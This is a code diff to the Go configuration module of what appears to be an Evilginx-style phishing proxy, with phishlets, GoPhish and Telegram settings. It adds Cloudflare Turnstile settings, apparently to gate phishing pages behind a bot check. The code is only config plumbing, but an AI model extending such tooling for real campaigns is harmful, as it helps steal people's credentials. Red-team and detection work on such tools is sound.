@@ -76,6 +76,11 @@ type TelegramConfig struct {
 	Enabled  bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
 }
 
+type TurnstileConfig struct {
+	SiteKey string `mapstructure:"site_key" json:"site_key" yaml:"site_key"`
+	Enabled bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
+}
+
 type AuthConfig struct {
 	KeyHash      string    `mapstructure:"key_hash" json:"key_hash" yaml:"key_hash"`
 	IsSetup      bool      `mapstructure:"is_setup" json:"is_setup" yaml:"is_setup"`
@@ -102,6 +107,7 @@ type Config struct {
 	blacklistConfig *BlacklistConfig
 	gophishConfig   *GoPhishConfig
 	telegramConfig  *TelegramConfig
+	turnstileConfig *TurnstileConfig
 	authConfig      *AuthConfig
 	proxyConfig     *ProxyConfig
 	phishletConfig  map[string]*PhishletConfig
@@ -125,6 +131,7 @@ const (
 	CFG_SUBPHISHLETS = "subphishlets"
 	CFG_GOPHISH      = "gophish"
 	CFG_TELEGRAM     = "telegram"
+	CFG_TURNSTILE    = "turnstile"
 )
 
 const DEFAULT_UNAUTH_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll
@@ -135,6 +142,7 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 		certificates:    &CertificatesConfig{},
 		gophishConfig:   &GoPhishConfig{},
 		telegramConfig:  &TelegramConfig{},
+		turnstileConfig: &TurnstileConfig{},
 		authConfig:      &AuthConfig{},
 		phishletConfig:  make(map[string]*PhishletConfig),
 		phishlets:       make(map[string]*Phishlet),
@@ -179,6 +187,8 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c.cfg.UnmarshalKey(CFG_GOPHISH, &c.gophishConfig)
 
 	c.cfg.UnmarshalKey(CFG_TELEGRAM, &c.telegramConfig)
+	
+	c.cfg.UnmarshalKey(CFG_TURNSTILE, &c.turnstileConfig)
 	
 	c.cfg.UnmarshalKey("auth", &c.authConfig)
 
@@ -975,4 +985,31 @@ func (c *Config) IsLocked() bool {
 
 func (c *Config) UpdateLastAccess() {
 	c.authConfig.LastAccess = time.Now()
+}
+
+// Turnstile methods
+func (c *Config) GetTurnstileSiteKey() string {
+	return c.turnstileConfig.SiteKey
+}
+
+func (c *Config) GetTurnstileEnabled() bool {
+	return c.turnstileConfig.Enabled
+}
+
+func (c *Config) SetTurnstileSiteKey(siteKey string) {
+	c.turnstileConfig.SiteKey = siteKey
+	c.cfg.Set(CFG_TURNSTILE, c.turnstileConfig)
+	log.Info("turnstile site key set")
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetTurnstileEnabled(enabled bool) {
+	c.turnstileConfig.Enabled = enabled
+	c.cfg.Set(CFG_TURNSTILE, c.turnstileConfig)
+	if enabled {
+		log.Info("turnstile enabled")
+	} else {
+		log.Info("turnstile disabled")
+	}
+	c.cfg.WriteConfig()
 }
